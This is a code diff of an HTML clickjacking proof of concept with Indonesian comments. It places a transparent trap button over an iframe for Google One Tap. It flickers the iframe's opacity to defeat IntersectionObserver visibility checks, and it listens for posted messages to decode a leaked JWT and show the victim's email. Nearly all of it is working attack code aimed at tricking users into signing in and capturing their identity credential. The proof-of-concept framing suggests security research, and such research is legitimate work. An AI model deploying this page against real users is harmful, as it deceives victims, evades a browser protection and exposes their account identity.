@@ -2,59 +2,67 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>High-Agression Clickjacking</title>
+    <title>High-Agression Clickjacking PoC</title>
     <style>
-        body { margin: 0; padding: 20px; font-family: sans-serif; }
+        body { margin: 0; padding: 20px; font-family: sans-serif; position: relative; }
         
-        /* Iframe berisi Google One Tap */
+        /* Iframe berisi target Google One Tap */
         #target-frame {
             width: 400px;
-            height: 150px;
+            height: 200px;
             border: 1px solid #ccc;
-            transition: opacity 0.01s; /* Transisi instan */
-            opacity: 1;
+            opacity: 1; /* Mulai dengan terlihat */
+            z-index: 1; /* Di bawah tombol jebakan */
         }
 
-        /* Tombol jebakan di atas iframe */
+        /* Tombol jebakan transparan yang akan "menumpang tindih" tombol Google */
+        /* Posisi dan ukuran harus pas dengan tombol "Continue as..." */
         #trap-btn {
             position: absolute;
-            top: 25px; /* Sesuaikan agar pas dengan posisi tombol login */
-            left: 25px; 
-            width: 350px;
-            height: 60px;
-            z-index: 999;
-            background: transparent; /* Transparan agar korban tidak curiga */
-            cursor: pointer;
+            /* SESUAIKAN NILAI INI SESUAI LAYAR ANDA */
+            top: 130px; 
+            left: 80px; 
+            width: 240px; /* Perkiraan lebar tombol Google */
+            height: 40px; /* Perkiraan tinggi tombol Google */
+            z-index: 10; /* Di atas iframe */
+            background: rgba(255, 0, 0, 0.1); /* Merah sangat transparan untuk testing, ubah jadi transparant total di akhir */
             border: none;
+            cursor: pointer;
+            outline: none; /* Hilangkan focus outline */
         }
     </style>
 </head>
 <body>
     <h3>Click for a surprise!</h3>
     
-    <div style="position: relative;">
-        <button id="trap-btn" onmouseover="startAttack()"></button>
-        <iframe id="target-frame" src="target.html"></iframe>
-    </div>
+    <button id="trap-btn" onmouseover="startAttack()"></button>
+    
+    <iframe id="target-frame" src="target.html"></iframe>
 
     <div id="res" style="margin-top: 20px; font-weight: bold;"></div>
 
     <script>
         function startAttack() {
             const frame = document.getElementById("target-frame");
+            // Teknik Timing Attack Agresif (Race Condition)
             // Melakukan "hammering" pada opacity agar IntersectionObserver bingung
             let count = 0;
             let interval = setInterval(() => {
+                // Berganti antara hampir transparan untuk menipu deteksi
                 frame.style.opacity = (count % 2 === 0) ? '0.01' : '0.02';
                 count++;
-                if (count > 50) clearInterval(interval); // Berhenti setelah 50 kali perubahan
+                // Berhenti setelah 100 kali perubahan
+                if (count > 100) clearInterval(interval); 
             }, 5); 
         }
 
+        // Listener untuk menangkap kredensial yang bocor
         window.onmessage = (e) => {
             if (e.data && e.data.credential) {
                 const payload = JSON.parse(atob(e.data.credential.split('.')[1]));
-                document.getElementById('res').innerText = "DATA BOCOR: " + payload.email;
+                document.getElementById('res').innerHTML = 
+                    `<div class="alert alert-success">DATA BOCOR: ${payload.email}</div>`;
+                console.log("Credential leaked:", payload);
             }
         };
     </script>
